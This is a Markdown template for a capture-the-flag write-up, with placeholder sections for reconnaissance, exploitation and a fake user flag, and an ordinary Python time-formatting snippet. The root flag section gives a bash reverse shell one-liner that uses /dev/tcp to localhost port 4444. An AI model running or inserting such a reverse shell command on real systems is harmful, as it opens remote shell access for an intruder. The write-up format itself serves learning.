# Information Gathering

## Nmap
We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.

```console

```
From the above output we can see that ports, **22**, **53**, **81**, and **444** are the ports open. 

Look  here's an image of my website, this is how you format an image.

![My Website](./images/ryankozak.com.png)
**Figure :** ....

Maybe we want to show some python code too, to let's take a look at a snipped from [codewars](https://www.codewars.com) to format time as human readable.

```python
def make_readable(seconds):        

    hours = seconds / 60**2
    minutes = seconds/60 - hours*60
    seconds = seconds - hours*(60**2) - minutes*60

    return '%02d:%02d:%02d' % (hours, minutes, seconds)
```


# Exploitation  
In order to gain our initial foothold we need to blablablabla. 
**EITHER LINK TO CODE OR LINK TO CODE + CHANGED SECTION**

```python
print("[+] Exploited System!")
```


## User Flag
In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

```
x@wartop:~$ cat user.txt
6u6baafnd3d54fc3b47squhp4e2bhk67
```

## Root Flag
The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.


![Root](./images/root.png)
**Figure :** ....


# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.

# References
1. [GOOGLE](https://google.co.uk)